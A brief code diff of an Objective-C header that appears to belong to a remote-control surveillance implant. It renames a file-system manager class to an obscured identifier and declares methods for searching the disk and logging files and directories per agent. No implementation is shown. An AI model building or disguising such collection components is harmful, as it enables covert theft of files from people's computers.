@@ -30,11 +30,11 @@ typedef struct _fileSystemHeader {
   u_int timestampHi;
 } fileSystemHeader;
 
-@interface RCSMFileSystemManager : NSObject
+@interface __m_MFileSystemManager : NSObject
 
 - (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData;
+- (NSArray *)searchFilesOnHD: (NSString *)aFileMask;
 - (BOOL)logFileAtPath: (NSString *)aFilePath forAgentID: (uint32_t)agentID;
 - (BOOL)logDirContent: (NSString *)aDirPath withDepth: (uint32_t)aDepth;
-- (NSArray *)searchFilesOnHD: (NSString *)aFileMask;
 
 @end
